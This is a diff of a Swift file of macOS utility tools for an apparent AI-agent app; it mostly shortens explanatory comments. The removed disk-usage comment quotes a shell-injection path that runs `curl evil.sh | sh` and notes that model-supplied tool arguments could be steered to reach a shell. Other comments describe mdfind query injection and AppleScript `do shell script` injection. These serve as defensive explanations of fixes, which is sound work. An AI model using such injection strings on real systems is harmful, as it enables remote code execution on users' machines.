@@ -4,9 +4,7 @@
 //  MacOSUtilityTools.swift
 //  Devgentic
 //
-//  High-value macOS utility tools for autonomous AI agents.
-//  Screen capture, Finder tags, disk usage, display management,
-//  system settings, login items, and external device enumeration.
+//  Created by Raj Singh.
 //
 
 import Foundation
@@ -18,6 +16,7 @@ private let logger = DGLogger(category: "MacOSUtilityTools")
 
 // MARK: - Screen Capture Tool
 
+/// Captures the screen to an image file; one of the macOS utility tools (Finder tags, disk usage, displays, settings).
 struct ScreenCaptureTool: DevgenticTool {
     let name = "screen_capture"
     let category = "Vision & UI"
@@ -114,12 +113,8 @@ struct ScreenCaptureTool: DevgenticTool {
         process.executableURL = URL(fileURLWithPath: "/usr/sbin/screencapture")
         process.arguments = cmdArgs
 
-        // The last hand-rolled subprocess in the tool tree. It was safe from the pipe deadlock
-        // only because it attached no pipes at all — and that is exactly why it could not say why
-        // a capture failed: `screencapture` reports a denied Screen Recording permission, a bad
-        // region and an unwritable path on STDERR, all of which went to the app's own stderr
-        // where the model could never see them. "The capture may have been cancelled" was the
-        // tool's guess, offered for every one of those causes.
+        // Runs `screencapture` through `ProcessRunner` so its stderr (denied Screen Recording permission, bad region,
+        // unwritable path) reaches the model instead of a generic "capture may have been cancelled" guess.
         let run: ProcessRunner.Result
         do {
             run = try ProcessRunner.run(process)
@@ -147,12 +142,9 @@ struct ScreenCaptureTool: DevgenticTool {
 
 // MARK: - Finder Tags Tools
 
-/// Replacing every Finder tag on a file — split from `finder_tags` on 2026-07-31.
-///
-/// The distinction that earns it a separate tool: `add` and `remove` are relative and leave
-/// untouched whatever they do not name, while this discards the existing set outright, and an
-/// empty `tags` array clears the file. A model that reaches for "set the tag to Important" does
-/// not necessarily intend "and drop Red, Work and the other four". Classified `.destructive`.
+/// Replaces every Finder tag on a file; an empty `tags` array clears the file.
+/// Separate from `finder_tags` because `add`/`remove` are relative, whereas this discards the existing set.
+/// Classified `.destructive`.
 struct ReplaceFinderTagsTool: DevgenticTool {
     let name = "replace_finder_tags"
     let category = "File System"
@@ -256,10 +248,7 @@ struct FinderTagsTool: DevgenticTool {
                 return "Error: 'path' and 'tags' required for add."
             }
             let expandedPath = FilePathResolver.resolve(path)
-            // Checked, like `read` and `replace_finder_tags` already do. Without it the missing
-            // file reached `setResourceValue` and the tool THREW Foundation's raw error, so one
-            // tool answered "that file isn't there" two different ways depending on which action
-            // the model picked — a returned message for `read`, an exception for `add`.
+            // Checked up front, as in `read`, so a missing file returns a message rather than a raw Foundation error.
             guard FileManager.default.fileExists(atPath: expandedPath) else {
                 return "Error: File not found at '\(expandedPath)'."
             }
@@ -293,10 +282,7 @@ struct FinderTagsTool: DevgenticTool {
             return "Removed tags \(removeTags) from '\(path)'. Remaining: \(currentTags.isEmpty ? "none" : currentTags.joined(separator: ", "))"
 
         case "set":
-            // Split out to `replace_finder_tags` on 2026-07-31. `add` and `remove` are relative
-            // and preserve what they do not name; `set` discards every existing tag, and
-            // `tags: []` clears the file. That is a different kind of act from reading tags and
-            // should not share one `requiresConfirmation` with it.
+            // `set` lives in `replace_finder_tags` because it discards every existing tag and needs its own confirmation setting.
             return "Error: 'set' has moved to the `replace_finder_tags` tool, so it can carry its "
                 + "own confirmation setting. Use 'add' or 'remove' here to change tags without "
                 + "discarding the others."
@@ -309,23 +295,14 @@ struct FinderTagsTool: DevgenticTool {
 
             let process = Process()
             process.executableURL = URL(fileURLWithPath: "/usr/bin/mdfind")
-            // `mdfind` is a fourth interpreter: its argument is a QUERY language, not a plain
-            // string. `searchTag` sits inside single quotes there, so a tag containing `'` ends
-            // the literal and the rest is parsed as query syntax — a malformed or silently
-            // widened search (e.g. a tag of `x' || kMDItemUserTags == '*`). No shell is involved,
-            // so this is not RCE, but the query is not the one the caller asked for.
-            //
-            // Escape backslash first, then the quote, for the same reason `AppleScriptEscaping`
-            // does: otherwise the escapes introduced here would themselves be escaped.
+            // `mdfind` takes a query language: a `'` in `searchTag` would end the literal and be parsed as query syntax.
+            // Escape the backslash first, then the quote, or the added escapes would themselves be escaped.
             let escapedTag = searchTag
                 .replacingOccurrences(of: "\\", with: "\\\\")
                 .replacingOccurrences(of: "'", with: "\\'")
             process.arguments = ["-onlyin", searchPath, "kMDItemUserTags == '\(escapedTag)'"]
 
             do {
-                // ProcessRunner drains stdout AND stderr concurrently. This site piped
-                // stderr to a `Pipe()` nobody ever read — not a discard, a 64 KB buffer
-                // that hangs the child once full.
                 let output = try ProcessRunner.run(process).standardOutput
                     .trimmingCharacters(in: .whitespacesAndNewlines)
 
@@ -428,9 +405,6 @@ struct DiskUsageTool: DevgenticTool {
             process.arguments = ["-sh", expandedPath]
 
             do {
-                // ProcessRunner drains stdout AND stderr concurrently. This site piped
-                // stderr to a `Pipe()` nobody ever read — not a discard, a 64 KB buffer
-                // that hangs the child once full.
                 let output = try ProcessRunner.run(process).standardOutput
                     .trimmingCharacters(in: .whitespacesAndNewlines)
                 return "Folder size: \(output)"
@@ -444,21 +418,8 @@ struct DiskUsageTool: DevgenticTool {
             // let one call return the entire tree.
             let topN = max(1, min(arguments.top_n ?? 10, 200))
 
-            // `find` is invoked DIRECTLY, never through a shell.
-            //
-            // This used to build a `/bin/zsh -c` string with `searchPath` interpolated inside
-            // double quotes:
-            //     find "\(searchPath)" -type f … | sort -rh | head -\(topN)
-            // A `path` containing a double quote closes that quote and everything after it is
-            // shell syntax, so `/tmp" ; curl evil.sh | sh ; echo "` ran as its own command.
-            // `path` is a tool ARGUMENT supplied by the model, so anything able to influence
-            // the model reached a shell through a DISK-USAGE tool — one a profile withholding
-            // shell access would have no reason to suspect.
-            //
-            // `du`, `{}` and `+` are OUR literals in an argv we build, not shell words: `-exec`
-            // is a `find` predicate, so the batching (and its speed) survives the conversion
-            // intact. Only the `sort`/`head` pipeline had to move into Swift, which is where
-            // `glob_files` already applies its limit.
+            // `find` is invoked directly, never through a shell: `path` is a model-supplied argument.
+            // `du`, `{}` and `+` are literals in our argv; `-exec ... +` keeps batching, and the sort/head step runs in Swift.
             let process = Process()
             process.executableURL = URL(fileURLWithPath: "/usr/bin/find")
             process.arguments = [
@@ -466,30 +427,16 @@ struct DiskUsageTool: DevgenticTool {
                 "-not", "-path", "*/.git/*",
                 "-not", "-path", "*/node_modules/*",
                 "-not", "-path", "*/DerivedData/*",
-                // `-k` not `-h`: kilobytes sort numerically. `-h` produced "1.2M"/"900K"
-                // strings that only `sort -rh` could order, and that was the reason for the
-                // shell pipeline in the first place.
+                // `-k` rather than `-h`: kilobyte counts sort numerically in Swift, with no shell `sort -rh` needed.
                 "-exec", "du", "-k", "{}", "+",
             ]
 
             do {
-                // stderr is ignored rather than redirected with `2>/dev/null`: `find` reports
-                // unreadable directories there and exits non-zero, which is not a failure of
-                // the search. ProcessRunner keeps the streams apart, so ignoring it needs no
-                // shell redirection.
+                // stderr is ignored: `find` reports unreadable directories there and exits non-zero, which is not a search failure.
                 let output = try ProcessRunner.run(process).standardOutput
 
-                // `du -k` emits "<kilobytes>\t<path>" per RECORD — but a record is not the same
-                // thing as a line, because a filename may legally contain a newline. Splitting on
-                // "\n" and discarding whatever fails to parse meant such a file was dropped from
-                // the results ENTIRELY and silently: the caller asked which files are largest and
-                // got an answer that omitted one, with nothing to say so. Newline-bearing names
-                // are not exotic — anything named from pasted text acquires one.
-                //
-                // A record therefore starts at a line that BOTH begins with `<digits>\t` AND
-                // whose path begins with the search root, which is what `find` prints. Anything
-                // else is the remainder of the previous record's filename, and the newline that
-                // split it is restored.
+                // `du -k` emits one record per file, but a filename may contain a newline, so a record is not always a line.
+                // A record starts at a line that begins with `<digits>\t` and whose path begins with the search root.
                 let entries: [(kb: Int, path: String)] = Self.parseDiskUsageRecords(
                     output, rootedAt: searchPath
                 )
@@ -516,40 +463,16 @@ struct DiskUsageTool: DevgenticTool {
         }
     }
 
+    // Why: an empty segment in a name (`\n\n` or a trailing `\n`) is unrecoverable, and the empty-segment guard must stay,
+    // or every ordinary path would gain a spurious trailing newline.
     /// Parses `du -k` output into records, tolerating filenames that contain newlines.
-    ///
-    /// Extracted and made `static` so the ambiguity it resolves can be tested directly — it is
-    /// the kind of parsing whose failure mode is a MISSING ROW rather than an error, which is
-    /// unobservable from the tool's output.
-    ///
-    /// Two known limitations, both inherent to a newline-delimited format rather than to this
-    /// parser, and both pinned by `DiskUsageParserProperties`:
-    ///
-    /// 1. A filename whose embedded newline is followed by text that itself looks like
-    ///    `<digits>\t<searchRoot>…` starts a spurious record. Requiring the root prefix makes
-    ///    that vanishingly unlikely; `find -print0` would not help, since it is `du` that formats
-    ///    these lines.
-    /// 2. An EMPTY line-segment in a name — a `\n\n` run, or a trailing `\n` — is unrecoverable:
-    ///    `<kb>\t<path>\n` where the path ends in a newline is byte-identical to that path
-    ///    followed by the record separator. The empty-segment guard below is kept deliberately;
-    ///    dropping the blank piece mangles a pathological name, whereas removing the guard would
-    ///    append a spurious newline to EVERY ordinary path, since du's output ends with one. The
-    ///    file, and its size, are still reported either way.
+    /// `static` so the ambiguity is directly testable; a parse failure shows up as a missing row, not an error.
+    /// Limitation: a name whose embedded newline is followed by `<digits>\t<root>` text starts a spurious record.
     static func parseDiskUsageRecords(_ output: String, rootedAt root: String) -> [(kb: Int, path: String)] {
         var records: [(kb: Int, path: String)] = []
 
-        // Split on SCALARS, not Characters.
-        //
-        // `String.split(separator: "\n")` and `components(separatedBy:)` are grapheme-aware, and
-        // `\r\n` is a single grapheme cluster — so when a filename ends in a carriage return, the
-        // record separator that follows MERGES with it and the split never happens there. The two
-        // records then arrive as one line, the second is absorbed into the first's path, and it
-        // disappears from the results entirely. That is the same silent dropped-row failure as
-        // the embedded-newline case above, reached through Swift's string segmentation rather
-        // than through the format.
-        //
-        // Scalars do not merge, so `\r` and `\n` are seen separately; a genuine `\r\n` inside a
-        // name is split here and rejoined by the continuation logic below, arriving intact.
+        // Split on scalars, not Characters: `\r\n` is a single grapheme, so a filename ending in `\r` would merge
+        // with the record separator and the next record would be absorbed into its path.
         let lines = output.unicodeScalars
             .split(separator: "\n", omittingEmptySubsequences: false)
             .map { String(String.UnicodeScalarView($0)) }
@@ -647,9 +570,6 @@ struct DisplayManagementTool: DevgenticTool {
             process.arguments = ["-c", "ioreg -c AppleBacklightDisplay | grep -i brightness | tail -1"]
 
             do {
-                // ProcessRunner drains stdout AND stderr concurrently. This site piped
-                // stderr to a `Pipe()` nobody ever read — not a discard, a 64 KB buffer
-                // that hangs the child once full.
                 let output = try ProcessRunner.run(process).standardOutput
                     .trimmingCharacters(in: .whitespacesAndNewlines)
 
@@ -666,20 +586,8 @@ struct DisplayManagementTool: DevgenticTool {
                 return "Error: 'brightness' must be between 0.0 and 1.0."
             }
 
-            // Three things were wrong with this branch until 2026-08-01, all cleaned up here:
-            //
-            // 1. It built an AppleScript into a `let script` that was NEVER USED — dead from the
-            //    moment it was written; the work was done by the shell below.
-            // 2. When the `brightness` CLI was missing it ran
-            //    `osascript -e 'tell application "System Preferences" to quit'`, quitting an app
-            //    the user may have had open, for no stated reason and with no bearing on setting
-            //    brightness.
-            // 3. That path then returned "Brightness CLI not found…", which does not begin with
-            //    "Error" — so `ToolExecutionMediator` recorded a brightness change that never
-            //    happened as a SUCCESSFUL call.
-            //
-            // The `command -v` test was the only real work the shell was doing, and Swift can ask
-            // that question directly — so the shell goes too.
+            // Looks for the `brightness` CLI directly rather than through a shell; results start with "Error" so the
+            // mediator records a missing tool as a failure.
             let brightnessCLI = ["/opt/homebrew/bin/brightness", "/usr/local/bin/brightness"]
                 .first { FileManager.default.fileExists(atPath: $0) }
 
@@ -736,11 +644,7 @@ struct OpenSystemSettingsTool: DevgenticTool {
     }
 
     /// Maps a pane name to its `x-apple.systempreferences:` URL.
-    ///
-    /// Extracted from `call` so it can be tested: the mapping is 28 entries of pure data, and
-    /// the only way to exercise it in place was to actually open System Settings on the user's
-    /// machine — which is why it never was. `nil` means "no specific pane", and the caller opens
-    /// Settings at its default location rather than failing.
+    /// Returns nil for an unrecognised name, in which case the caller opens Settings at its default location.
     static func paneURL(for pane: String) -> String? {
         // macOS 13+ uses the x-apple.systempreferences URL scheme.
         switch pane.lowercased() {
@@ -771,9 +675,7 @@ struct OpenSystemSettingsTool: DevgenticTool {
         case "siri": return "x-apple.systempreferences:com.apple.Siri-Settings.extension"
         case "spotlight": return "x-apple.systempreferences:com.apple.Siri-Settings.extension"
         default:
-            // An unrecognised name is NOT an error: Settings opens at its default location, so a
-            // model guessing a plausible pane still lands the user somewhere useful. `nil` lets
-            // the caller say which of the two happened.
+            // An unrecognised name is not an error: Settings opens at its default location, and nil lets the caller say so.
             return nil
         }
     }
@@ -787,9 +689,7 @@ struct OpenSystemSettingsTool: DevgenticTool {
                 return "Error: could not construct a URL for pane '\(arguments.pane)'."
             }
             NSWorkspace.shared.open(url)
-            // The two outcomes are reported distinctly. Previously an unknown pane opened
-            // Settings and reported "Opened System Settings: <pane>", so a model that guessed a
-            // pane name that does not exist was told it had landed on it.
+            // The two outcomes are reported distinctly so a model that guessed a nonexistent pane is not told it landed on it.
             return resolved == nil
                 ? "Opened System Settings. '\(arguments.pane)' is not a pane this tool recognises, so it opened at the default location."
                 : "Opened System Settings: \(arguments.pane)."
@@ -834,9 +734,6 @@ struct LoginItemsTool: DevgenticTool {
             """]
 
             do {
-                // ProcessRunner drains stdout AND stderr concurrently. This site piped
-                // stderr to a `Pipe()` nobody ever read — not a discard, a 64 KB buffer
-                // that hangs the child once full.
                 let output = try ProcessRunner.run(process).standardOutput
                     .trimmingCharacters(in: .whitespacesAndNewlines)
 
@@ -942,9 +839,6 @@ struct ExternalDevicesTool: DevgenticTool {
         process.arguments = args
 
         do {
-            // ProcessRunner drains stdout AND stderr concurrently. This site piped
-            // stderr to a `Pipe()` nobody ever read — not a discard, a 64 KB buffer
-            // that hangs the child once full.
             var output = try ProcessRunner.run(process).standardOutput
                 .trimmingCharacters(in: .whitespacesAndNewlines)
 
@@ -1012,11 +906,7 @@ struct AppleNotesTool: DevgenticTool {
             let limit = arguments.limit ?? 20
             let folderClause: String
             if let folder = arguments.folder {
-                // `escapeAppleScript`, like every other interpolation in this tool. This one
-                // site was raw: a `folder` value closing the string literal could append
-                // `do shell script "…"`, which is arbitrary command execution — the sibling
-                // `create` and `search` paths escaped identically-sourced values, so this was
-                // an omission rather than a design.
+                // Escaped like every other interpolation: a raw `folder` could close the literal and append `do shell script`.
                 folderClause = "of folder \"\(Self.escapeAppleScript(folder))\""
             } else {
                 folderClause = ""
@@ -1138,9 +1028,6 @@ struct AppleNotesTool: DevgenticTool {
         process.arguments = ["-e", script]
 
         do {
-            // Both streams drained CONCURRENTLY. Reading them in sequence — as this did —
-            // blocks on whichever is read second while the other pipe fills: the two-pipe form
-            // of the deadlock, and the one a naive "swap the two lines" fix does not touch.
             let run = try ProcessRunner.run(process)
             let output = run.standardOutput.trimmingCharacters(in: .whitespacesAndNewlines)
             let errOutput = run.standardError.trimmingCharacters(in: .whitespacesAndNewlines)
